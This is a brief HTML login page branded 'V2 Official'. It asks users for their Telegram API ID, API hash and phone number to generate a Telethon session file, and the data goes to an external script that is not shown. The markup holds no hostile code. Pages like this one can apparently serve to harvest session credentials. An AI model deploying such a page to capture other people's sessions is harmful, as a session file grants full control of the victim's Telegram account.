<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>V2 Official - Telethon Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <h1>Welcome to V2 Official</h1>
        <p>Login with your Telethon API Keys to generate your session file.</p>
        <form id="telethon-form">
            <input type="text" id="api_id" placeholder="Enter Your API ID" required>
            <input type="text" id="api_hash" placeholder="Enter Your API Hash" required>
            <input type="text" id="phone_number" placeholder="Enter Your Phone Number" required>
            <button type="submit">Generate Session</button>
        </form>
    </div>
    <script src="script.js"></script>
</body>
</html>
